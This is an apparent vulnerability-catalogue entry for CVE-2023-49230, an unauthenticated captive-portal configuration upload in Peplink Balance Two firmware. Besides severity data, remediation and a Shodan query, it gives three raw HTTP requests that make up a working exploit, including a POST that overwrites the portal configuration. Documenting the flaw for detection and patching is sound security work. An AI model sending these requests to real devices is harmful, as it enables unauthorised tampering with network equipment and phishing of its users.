---
layout: post
cve_id: CVE-2023-49230
title: Peplink Balance Two before 8.4.0 - Unauthenticated Config Upload
pcap: true
pcap_path: /pcaps/2023/CVE-2023-49230.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-49230.yaml
snort2_rule: N/A
snort3_rule: N/A
author: srilakivarma
severity: high
impact: 'Unauthenticated attackers can modify captive portal configurations and upload
  files, potentially enabling phishing attacks or system compromise.

  '
remediation: 'Upgrade Peplink Balance Two to version 8.4.0 or later.

  '
reference:
- https://www.synacktiv.com/publications%253Ffield_tags_target_id%253D4
- https://www.synacktiv.com/sites/default/files/2023-12/synacktiv-peplink-multiple-vulnerabilities.pdf
- https://nvd.nist.gov/vuln/detail/CVE-2023-49230
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
  cvss-score: 8.8
  cve-id: CVE-2023-49230
  cwe-id: CWE-862
  epss-score: 0.20665
  epss-percentile: 0.95401
  cpe: cpe:2.3:o:peplink:balance_two_firmware:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 3
  vendor: peplink
  product: balance_two_firmware
  shodan-query: html:"PEPLINK"
tags:
- cve
- cve2023
- peplink
- intrusive
- file-upload
- vuln
---

## üîç Vulnerability Description
A vulnerability in Peplink Balance Two prior to version 8.4.0 allows unauthenticated attackers to modify captive portal configurations due to a missing authorization check. Specifically, attackers can upload files via /guest/portal_admin_upload.cgi, with the changes reflected at /guest/preview.cgi?portal_id=1.


## üåê HTTP Request
```nohighlight
GET /cgi-bin/MANGA/index.cgi HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
POST /guest/portal_admin_upload.cgi HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: close
Content-Length: 1425
Content-Type: multipart/form-data; boundary=---------------------------370611892836891531633729116268
Accept-Encoding: gzip
-----------------------------370611892836891531633729116268
Content-Disposition: form-data; name="option"
edit_page
-----------------------------370611892836891531633729116268
Content-Disposition: form-data; name="mode"
submit
-----------------------------370611892836891531633729116268
Content-Disposition: form-data; name="portal_id"
1
-----------------------------370611892836891531633729116268
Content-Disposition: form-data; name="data"
{"status":"ok","config":{"login":{"access_mode":"open","message":"","tnc_content":"Terms and Conditions.","tnc_title":"Terms and Conditions","tnc_link":"terms","tnc_prompt":"I agree to #TNC_LINK#","back_login_button":"Back to Login","agree_button":"38F1f0mswL3743D7rlfqxYvoCBK","session_id1":" ","session_id2":" "},"common":{"hide_quota":"no","landing_url":"","logo_url":"logo.cgi?portal_id=1&type=preview","logo_url_def":"logo.cgi?default=1","uploaded_logo_size":0,"footer":"Powered by Peplink.","footer_default":"Powered by Peplink."},"success":{},"reach_quota":{},"quota":{"limit":{"data":0,"session_timeout":1800}}}}
-----------------------------370611892836891531633729116268
Content-Disposition: form-data; name="logo_action"
x
-----------------------------370611892836891531633729116268
Content-Disposition: form-data; name="logo"; filename=""
Content-Type: application/octet-stream
-----------------------------370611892836891531633729116268--
```

```nohighlight
POST /guest/api.cgi HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36
Connection: close
Content-Length: 36
Accept-Encoding: gzip
mode=info&option=preview&portal_id=1
```

